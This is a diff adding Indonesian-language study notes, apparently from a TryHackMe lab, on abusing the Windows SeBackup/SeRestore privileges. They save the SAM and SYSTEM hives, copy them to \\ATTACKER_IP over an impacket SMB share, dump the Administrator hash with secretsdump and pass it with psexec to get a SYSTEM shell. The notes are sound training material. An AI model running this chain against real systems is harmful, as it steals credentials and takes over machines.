@@ -1,0 +1,42 @@
+# Windows Privileges
+priv merupakan hak yang dimiliki suatu akun untuk melakukan specific system-related tasks, mulai dari shutdown machine sampai bypass DACL-based access controls. Setiap user memiliki priv yang dapat dicek dengan
+```
+whoami /priv
+```
+untuk catatan lengkap tentang priv di windows dapat akses `https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants`. Untuk dapat menemukan list lengkap exploitable priv dapat lihat di `https://github.com/gtworek/Priv2Admin` github project.
+
+## SeBackup / SeRestore
+SeBackup/SeRestore merupakan priv yang allow user untuk read write pada file apapun di system, menghiraukan DACL apapun. Jadi priv ini memungkinkan user untuk melakukan backup dari sistem tanpa memerlukan full administrative priv. Dari hal tersebut, attacker dapat escalate priv pada sistem dengan banyak cara, namun disini yang akan dibahas adalah copy SAM dan SYSTEM registry hives untuk extract local Administrator password hash.
+
+Untuk dapat backup SAM dan SYSTEM hash kita dapat menggunakan command:
+```
+reg save hklm\system C:\Users\THMBackup\system.hive
+
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+selanjutnya kita buat simple SMB server dengan impacket smbserver.py (github.com/fortra/impacket) di local/attacker machine kita
+```
+mkdir share
+
+sudo python3 /path/to/impacket/smbserver.py -smb2support -username WindowsUsername -password WindowsPassword public share
+```
+dan di target machine kita, kita lakukan pengiriman filenya
+```
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+
+Langkah selanjutnya kita dump hash password dari user dengan menggunakan secretsdump.py dari impacket
+```
+sudo /home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py -sam sam.hive -system system.hive LOCAL
+...
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+...
+```
+selanjutnya kita dapat menggunakan hash administrator tersebut untuk perform Pass-the-Hash attack dan mendapatkan akses ke target machine dengan SYSTEM priv. Kita dapat menggunakan psexec.py dari impacket
+``` 
+sudo /home/kali/.local/share/pipx/venvs/impacket/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@IP-target
+```
+dan kita akan mendapat shell session sebagai system
